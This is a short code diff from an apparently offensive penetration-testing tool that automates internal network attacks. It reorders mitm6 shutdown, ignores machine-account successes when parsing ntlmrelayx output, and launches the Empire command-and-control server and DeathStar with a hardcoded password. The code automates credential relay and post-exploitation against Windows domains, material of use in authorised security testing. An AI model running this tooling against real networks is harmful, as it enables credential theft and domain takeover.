@@ -924,14 +924,14 @@ def cleanup_mitm6(mitm6_proc):
     '''
     SIGINT mitm6
     '''
-    pid = mitm6_proc.pid
-    os.kill(pid, signal.SIGINT)
-    if not mitm6_proc.poll():
-        print('[*] Waiting on mitm6 to cleanly shut down...')
-
     arp_file = 'arp.cache'
     if os.path.isfile(arp_file):
         os.remove(arp_file)
+
+    pid = mitm6_proc.pid
+    os.kill(pid, signal.SIGINT)
+    print('[*] Waiting on mitm6 to cleanly shut down...')
+    time.sleep(5)
 
 def get_user_from_ntlm_hash(ntlm_hash):
     '''
@@ -981,7 +981,8 @@ def parse_ntlmrelay_line(line, successful_auth, prev_creds, args):
 
     if successful_auth == False:
         if ' SUCCEED' in line:
-            successful_auth = True
+            if '$ SUCCEED' not in line:
+                successful_auth = True
 
     if 'Executed specified command on host' in line:
         ip = line.split()[-1]
@@ -1135,7 +1136,7 @@ def run_empire(iface):
     user = 'icebreaker'
     passwd = 'P@ssword123456'
     empire_cmd = 'cd submodules/Empire;python2 empire --rest --username {} --password {}'.format(user,passwd)
-    ds_cmd = 'python submodules/DeathStar/DeathStar.py -u {} -p {} -lip http://{}:8080 -lp 8080'.format(user, passwd, get_local_ip(iface))
+    ds_cmd = 'python submodules/DeathStar/DeathStar.py -u {} -p {} -lip http://{}:8080 -lp 8080'.format(user, passwd, get_local_ip(iface))#1111
 
     empire_proc = run_proc_xterm(empire_cmd)
     # Time for Empire to load
